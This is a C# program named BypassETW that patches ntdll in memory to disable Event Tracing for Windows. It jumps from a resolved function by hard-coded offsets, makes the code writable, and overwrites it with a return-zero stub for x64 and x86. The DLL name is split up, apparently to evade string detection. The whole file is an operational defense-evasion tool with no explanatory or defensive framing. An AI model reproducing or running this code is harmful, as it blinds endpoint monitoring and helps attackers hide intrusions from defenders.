using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace BypassETW
{
    public class Program
    {
        static byte[] patch_code_x64 = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
        static byte[] patch_code_x86 = new byte[] { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
        public static uint etw_offset_x64 = 0x3DEC0;
        public static uint etw_offset_x86 = 0x590;

        [DllImport("kernel32")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        private static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }


        private static void MemoryPatch(byte[] patch, string lib, string funcName, uint offset = 0)
        {

            uint Oldprotect;
            uint Newprotect;

            IntPtr libAddr = LoadLibrary(lib);
            IntPtr funcAddr = GetProcAddress(libAddr, funcName);

            funcAddr = (IntPtr)(funcAddr.ToInt64() + offset);
            VirtualProtect(funcAddr, (UIntPtr)patch.Length, 0x40, out Oldprotect);
            Marshal.Copy(patch, 0, funcAddr, patch.Length);
            VirtualProtect(funcAddr, (UIntPtr)patch.Length, Oldprotect, out Newprotect);
        }

        private static void CodePatchETW(byte[] patch, uint offset = 0)
        {
            MemoryPatch(patch, "ntd" + "ll.d" + "ll", "RtlInitializeResource", offset);
        }

        public static void StartPatch()
        {
            if (is64Bit())
            {
                CodePatchETW(patch_code_x64, etw_offset_x64);
            }
            else
            {
                CodePatchETW(patch_code_x86, etw_offset_x86);
            }
        }


        static void Main(string[] args)
        {
            StartPatch();
        }
    }
}
